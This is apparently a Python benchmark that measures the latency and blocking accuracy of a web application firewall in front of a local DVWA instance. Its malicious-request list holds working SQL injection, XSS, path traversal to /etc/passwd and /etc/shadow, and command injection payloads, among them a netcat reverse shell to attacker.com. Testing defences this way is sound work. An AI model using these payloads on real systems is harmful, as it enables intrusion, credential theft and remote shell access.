"""
WireFall WAF Benchmark - Latency and Accuracy Metrics with Visualization
"""
import requests
import time
import random
import numpy as np
import matplotlib.pyplot as plt
from datetime import datetime

WAF_URL = "http://localhost:2323"

# DVWA-style benign requests (labeled as benign)
benign_requests = [
    {"method": "GET", "path": "/DVWA/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/login.php", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/index.php", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/setup.php", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/brute/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/exec/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/csrf/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/upload/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/xss_d/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/xss_r/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/xss_s/", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/security.php", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/about.php", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/logout.php", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/README.md", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/docs/DVWA_v1.3.pdf", "body": "", "label": "benign"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/fi/", "body": "page=file1.php", "label": "benign"},
    {"method": "GET", "path": "/DVWA/instructions.php", "body": "doc=readme", "label": "benign"},
    {"method": "GET", "path": "/DVWA/instructions.php", "body": "doc=PDF", "label": "benign"},
]

# Malicious requests (labeled as malicious)
malicious_requests = [
    # SQL Injection
    {"method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "body": "id=1' OR '1'='1", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "body": "id=1; DROP TABLE users--", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "body": "id=1 UNION SELECT * FROM passwords--", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/sqli_blind/", "body": "id=1' AND SLEEP(5)--", "label": "malicious"},
    {"method": "POST", "path": "/DVWA/login.php", "body": "username=admin'--&password=x&Login=Login", "label": "malicious"},
    
    # XSS
    {"method": "GET", "path": "/DVWA/vulnerabilities/xss_r/", "body": "name=<script>alert('XSS')</script>", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/xss_d/", "body": "default=<img src=x onerror=alert(1)>", "label": "malicious"},
    {"method": "POST", "path": "/DVWA/vulnerabilities/xss_s/", "body": "txtName=<script>document.cookie</script>&mtxMessage=test&btnSign=Sign", "label": "malicious"},
    
    # Command Injection
    {"method": "GET", "path": "/DVWA/vulnerabilities/exec/", "body": "ip=127.0.0.1; cat /etc/passwd", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/exec/", "body": "ip=127.0.0.1 && whoami", "label": "malicious"},
    {"method": "POST", "path": "/DVWA/vulnerabilities/exec/", "body": "ip=127.0.0.1 | nc -e /bin/sh attacker.com 4444&Submit=Submit", "label": "malicious"},
    
    # File Inclusion
    {"method": "GET", "path": "/DVWA/vulnerabilities/fi/", "body": "page=../../../etc/passwd", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/fi/", "body": "page=....//....//etc/shadow", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/fi/", "body": "page=php://filter/convert.base64-encode/resource=index.php", "label": "malicious"},
    
    # CSRF / Auth bypass
    {"method": "GET", "path": "/DVWA/vulnerabilities/csrf/", "body": "password_new=hacked&password_conf=hacked&Change=Change", "label": "malicious"},
    
    # Open Redirect
    {"method": "GET", "path": "/DVWA/vulnerabilities/open_redirect/", "body": "redirect=http://evil.com", "label": "malicious"},
    
    # More SQLi variants
    {"method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "body": "id=1' AND 1=1 UNION SELECT username,password FROM users--", "label": "malicious"},
    {"method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "body": "id=-1 UNION ALL SELECT NULL,CONCAT(user,':',password) FROM mysql.user--", "label": "malicious"},
    {"method": "GET", "path": "/page", "body": "id=1; EXEC xp_cmdshell('whoami')--", "label": "malicious"},
    {"method": "POST", "path": "/api/data", "body": "filter=1 UNION ALL SELECT NULL,NULL,CONCAT(username,':',password) FROM users--", "label": "malicious"},
]


def send_request(req, timeout=10):
    """Send a request and measure latency"""
    try:
        url = f"{WAF_URL}{req['path']}"
        start_time = time.perf_counter()
        
        if req["method"] == "GET":
            if req["body"]:
                url = f"{url}?{req['body']}"
            response = requests.get(url, timeout=timeout)
        else:
            data = {}
            if req["body"]:
                for pair in req["body"].split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        data[k] = v
            response = requests.post(url, data=data, timeout=timeout)
        
        end_time = time.perf_counter()
        latency_ms = (end_time - start_time) * 1000
        
        return {
            "status": response.status_code,
            "latency_ms": latency_ms,
            "blocked": response.status_code == 403,
            "error": None
        }
    except requests.exceptions.Timeout:
        return {"status": None, "latency_ms": timeout * 1000, "blocked": None, "error": "Timeout"}
    except requests.exceptions.RequestException as e:
        return {"status": None, "latency_ms": None, "blocked": None, "error": str(e)}


def run_benchmark(num_benign=50, num_malicious=50):
    """Run the benchmark with specified number of requests"""
    print("=" * 70)
    print("WireFall WAF Benchmark - Latency & Accuracy Metrics")
    print("=" * 70)
    print(f"Benign requests: {num_benign}")
    print(f"Malicious requests: {num_malicious}")
    print(f"Total: {num_benign + num_malicious}")
    print("=" * 70)
    
    results = []
    
    # Generate test set
    test_requests = []
    for i in range(num_benign):
        req = benign_requests[i % len(benign_requests)].copy()
        test_requests.append(req)
    for i in range(num_malicious):
        req = malicious_requests[i % len(malicious_requests)].copy()
        test_requests.append(req)
    
    # Shuffle
    random.shuffle(test_requests)
    
    # Run requests
    benign_latencies = []
    malicious_latencies = []
    
    # Confusion matrix values
    true_positives = 0   # Malicious correctly blocked
    false_positives = 0  # Benign incorrectly blocked
    true_negatives = 0   # Benign correctly allowed
    false_negatives = 0  # Malicious incorrectly allowed
    
    for i, req in enumerate(test_requests, 1):
        result = send_request(req)
        result["label"] = req["label"]
        result["request"] = req
        results.append(result)
        
        if result["error"]:
            status_str = f"❌ {result['error']}"
        elif result["blocked"]:
            status_str = "🛡️ BLOCKED"
        else:
            status_str = f"✅ ALLOWED ({result['status']})"
        
        label_icon = "⚠️" if req["label"] == "malicious" else "📄"
        
        # Calculate latency stats
        if result["latency_ms"] is not None:
            if req["label"] == "benign":
                benign_latencies.append(result["latency_ms"])
            else:
                malicious_latencies.append(result["latency_ms"])
        
        # Update confusion matrix
        if result["blocked"] is not None:
            if req["label"] == "malicious":
                if result["blocked"]:
                    true_positives += 1
                else:
                    false_negatives += 1
            else:
                if result["blocked"]:
                    false_positives += 1
                else:
                    true_negatives += 1
        
        latency_str = f"{result['latency_ms']:.0f}ms" if result["latency_ms"] else "N/A"
        print(f"[{i:3d}/{len(test_requests)}] {label_icon} {req['label']:9s} | {req['method']:4s} {req['path'][:30]:30s} | {latency_str:>8s} | {status_str}")
        
        time.sleep(0.02)
    
    return {
        "results": results,
        "benign_latencies": benign_latencies,
        "malicious_latencies": malicious_latencies,
        "confusion": {
            "TP": true_positives,
            "FP": false_positives,
            "TN": true_negatives,
            "FN": false_negatives
        },
        "num_benign": num_benign,
        "num_malicious": num_malicious
    }


def calculate_metrics(data):
    """Calculate accuracy metrics from confusion matrix"""
    cm = data["confusion"]
    TP, FP, TN, FN = cm["TP"], cm["FP"], cm["TN"], cm["FN"]
    
    total = TP + FP + TN + FN
    accuracy = (TP + TN) / total if total > 0 else 0
    precision = TP / (TP + FP) if (TP + FP) > 0 else 0
    recall = TP / (TP + FN) if (TP + FN) > 0 else 0  # Detection Rate
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    fpr = FP / (FP + TN) if (FP + TN) > 0 else 0  # False Positive Rate
    
    return {
        "accuracy": accuracy,
        "precision": precision,
        "recall": recall,  # Detection Rate / True Positive Rate
        "f1_score": f1,
        "false_positive_rate": fpr,
        "confusion_matrix": cm
    }


def create_visualizations(data, metrics):
    """Create matplotlib visualizations for latency and accuracy metrics"""
    
    fig = plt.figure(figsize=(16, 12))
    fig.suptitle('WireFall WAF Benchmark Results', fontsize=16, fontweight='bold')
    
    # 1. Latency Distribution Histogram
    ax1 = fig.add_subplot(2, 3, 1)
    all_latencies = data["benign_latencies"] + data["malicious_latencies"]
    if all_latencies:
        ax1.hist(all_latencies, bins=30, color='#3b82f6', edgecolor='white', alpha=0.7)
        ax1.axvline(np.mean(all_latencies), color='red', linestyle='--', linewidth=2, label=f'Mean: {np.mean(all_latencies):.0f}ms')
        ax1.axvline(np.percentile(all_latencies, 95), color='orange', linestyle='--', linewidth=2, label=f'P95: {np.percentile(all_latencies, 95):.0f}ms')
    ax1.set_xlabel('Latency (ms)')
    ax1.set_ylabel('Frequency')
    ax1.set_title('Latency Distribution')
    ax1.legend()
    ax1.grid(True, alpha=0.3)
    
    # 2. Latency Comparison (Benign vs Malicious)
    ax2 = fig.add_subplot(2, 3, 2)
    latency_data = []
    labels = []
    if data["benign_latencies"]:
        latency_data.append(data["benign_latencies"])
        labels.append('Benign')
    if data["malicious_latencies"]:
        latency_data.append(data["malicious_latencies"])
        labels.append('Malicious')
    if latency_data:
        bp = ax2.boxplot(latency_data, labels=labels, patch_artist=True)
        colors = ['#22c55e', '#ef4444']
        for patch, color in zip(bp['boxes'], colors[:len(latency_data)]):
            patch.set_facecolor(color)
            patch.set_alpha(0.7)
    ax2.set_ylabel('Latency (ms)')
    ax2.set_title('Latency by Request Type')
    ax2.grid(True, alpha=0.3)
    
    # 3. Confusion Matrix Heatmap
    ax3 = fig.add_subplot(2, 3, 3)
    cm = metrics["confusion_matrix"]
    cm_array = np.array([[cm["TN"], cm["FP"]], [cm["FN"], cm["TP"]]])
    im = ax3.imshow(cm_array, cmap='Blues')
    ax3.set_xticks([0, 1])
    ax3.set_yticks([0, 1])
    ax3.set_xticklabels(['Allowed', 'Blocked'])
    ax3.set_yticklabels(['Benign', 'Malicious'])
    ax3.set_xlabel('Predicted')
    ax3.set_ylabel('Actual')
    ax3.set_title('Confusion Matrix')
    
    # Add text annotations
    for i in range(2):
        for j in range(2):
            text = ax3.text(j, i, cm_array[i, j], ha="center", va="center", 
                          color="white" if cm_array[i, j] > cm_array.max()/2 else "black",
                          fontsize=20, fontweight='bold')
    
    # 4. Accuracy Metrics Bar Chart
    ax4 = fig.add_subplot(2, 3, 4)
    metric_names = ['Accuracy', 'Precision', 'Recall\n(Detection Rate)', 'F1 Score']
    metric_values = [metrics["accuracy"], metrics["precision"], metrics["recall"], metrics["f1_score"]]
    colors = ['#3b82f6', '#8b5cf6', '#22c55e', '#f59e0b']
    bars = ax4.bar(metric_names, metric_values, color=colors, edgecolor='white', linewidth=1.5)
    ax4.set_ylim(0, 1.1)
    ax4.set_ylabel('Score')
    ax4.set_title('Classification Metrics')
    ax4.axhline(y=1.0, color='gray', linestyle='--', alpha=0.5)
    
    # Add value labels on bars
    for bar, val in zip(bars, metric_values):
        ax4.text(bar.get_x() + bar.get_width()/2, bar.get_height() + 0.02, 
                f'{val:.1%}', ha='center', va='bottom', fontweight='bold')
    ax4.grid(True, alpha=0.3, axis='y')
    
    # 5. Latency Over Time (Request Sequence) - Zoomed in
    ax5 = fig.add_subplot(2, 3, 5)
    valid_results = [(i, r["latency_ms"], r["label"]) for i, r in enumerate(data["results"]) if r["latency_ms"]]
    if valid_results:
        indices = [x[0] for x in valid_results]
        latencies = [x[1] for x in valid_results]
        colors_scatter = ['#22c55e' if x[2] == 'benign' else '#ef4444' for x in valid_results]
        ax5.scatter(indices, latencies, c=colors_scatter, alpha=0.6, s=30)
        # Moving average
        if len(latencies) > 5:
            window = 5
            moving_avg = np.convolve(latencies, np.ones(window)/window, mode='valid')
            ax5.plot(range(window-1, len(latencies)), moving_avg, color='#3b82f6', linewidth=2, label='Moving Avg (5)')
            ax5.legend()
        # Zoom in: set y-axis limit to exclude extreme outliers (use P98)
        p98 = np.percentile(latencies, 98)
        ax5.set_ylim(0, min(p98 * 1.2, max(latencies)))
    ax5.set_xlabel('Request #')
    ax5.set_ylabel('Latency (ms)')
    ax5.set_title('Latency Over Request Sequence (Zoomed)')
    ax5.grid(True, alpha=0.3)
    
    # 6. Summary Statistics Text
    ax6 = fig.add_subplot(2, 3, 6)
    ax6.axis('off')
    
    all_latencies = data["benign_latencies"] + data["malicious_latencies"]
    
    summary_text = f"""
    LATENCY METRICS
    ───────────────────────────
    Total Requests: {len(data['results'])}
    Successful: {len(all_latencies)}
    
    Mean Latency: {np.mean(all_latencies):.1f} ms
    Median Latency: {np.median(all_latencies):.1f} ms
    Std Dev: {np.std(all_latencies):.1f} ms
    
    Min: {np.min(all_latencies):.1f} ms
    Max: {np.max(all_latencies):.1f} ms
    P95: {np.percentile(all_latencies, 95):.1f} ms
    P99: {np.percentile(all_latencies, 99):.1f} ms
    
    ACCURACY METRICS
    ───────────────────────────
    Accuracy: {metrics['accuracy']:.1%}
    Precision: {metrics['precision']:.1%}
    Recall (Detection Rate): {metrics['recall']:.1%}
    F1 Score: {metrics['f1_score']:.1%}
    False Positive Rate: {metrics['false_positive_rate']:.1%}
    
    CONFUSION MATRIX
    ───────────────────────────
    True Positives: {cm['TP']}
    True Negatives: {cm['TN']}
    False Positives: {cm['FP']}
    False Negatives: {cm['FN']}
    """
    
    ax6.text(0.1, 0.95, summary_text, transform=ax6.transAxes, fontsize=10,
             verticalalignment='top', fontfamily='monospace',
             bbox=dict(boxstyle='round', facecolor='#f8fafc', edgecolor='#e2e8f0'))
    
    plt.tight_layout(rect=[0, 0.03, 1, 0.95])
    
    # Save figure
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"waf_benchmark_{timestamp}.png"
    plt.savefig(filename, dpi=150, bbox_inches='tight', facecolor='white')
    print(f"\n📊 Graph saved to: {filename}")
    
    # Don't call plt.show() to avoid blocking
    plt.close()
    
    return filename


def main():
    # Run benchmark
    data = run_benchmark(num_benign=100, num_malicious=100)
    
    # Calculate metrics
    metrics = calculate_metrics(data)
    
    # Print summary
    cm = metrics["confusion_matrix"]
    all_latencies = data["benign_latencies"] + data["malicious_latencies"]
    
    print("\n" + "=" * 70)
    print("BENCHMARK RESULTS")
    print("=" * 70)
    
    print("\n📈 LATENCY METRICS:")
    print(f"  Mean: {np.mean(all_latencies):.1f} ms")
    print(f"  Median: {np.median(all_latencies):.1f} ms")
    print(f"  P95: {np.percentile(all_latencies, 95):.1f} ms")
    print(f"  P99: {np.percentile(all_latencies, 99):.1f} ms")
    print(f"  Min: {np.min(all_latencies):.1f} ms")
    print(f"  Max: {np.max(all_latencies):.1f} ms")
    
    print("\n🎯 ACCURACY METRICS:")
    print(f"  Accuracy: {metrics['accuracy']:.1%}")
    print(f"  Precision: {metrics['precision']:.1%}")
    print(f"  Recall (Detection Rate): {metrics['recall']:.1%}")
    print(f"  F1 Score: {metrics['f1_score']:.1%}")
    print(f"  False Positive Rate: {metrics['false_positive_rate']:.1%}")
    
    print("\n📊 CONFUSION MATRIX:")
    print(f"  True Positives (Malicious → Blocked): {cm['TP']}")
    print(f"  True Negatives (Benign → Allowed): {cm['TN']}")
    print(f"  False Positives (Benign → Blocked): {cm['FP']}")
    print(f"  False Negatives (Malicious → Allowed): {cm['FN']}")
    
    print("=" * 70)
    
    # Create visualizations
    create_visualizations(data, metrics)


if __name__ == "__main__":
    main()